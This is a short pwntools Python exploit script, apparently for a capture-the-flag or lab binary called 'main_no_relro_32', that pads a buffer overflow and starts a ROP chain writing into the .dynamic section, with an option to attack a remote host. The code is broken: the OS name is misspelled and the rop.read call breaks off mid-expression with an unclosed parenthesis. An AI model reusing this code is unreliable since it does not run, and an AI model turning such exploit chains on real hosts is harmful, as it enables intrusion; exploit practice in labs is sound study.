from pwn import *
context(os="linxu", arch="i386")

def debug_on():
	if (args.DEBUG):
		context.log_level = "debug"

g_fname = "./main_no_relro_32"
g_elf = ELF(g_fname)

if (args.REMOTE):
	g_io = remote(args.HOST, int(args.PORT))
else:
	g_io = process(g_fname)
	
def pwn():
	padding_len = 0x70
	rop = ROP(g_elf)
	rop.raw(padding_len*'a')
	dynsec = g_elf.get_section_by_name(".dynamic")
	dynsec_addr = dynsec.__getitem__("sh_addr")
	rop.read(0, dynsec.__getitem__(
	
if ("__main__" == __name__):
	pwn()
	g_io.interactive()
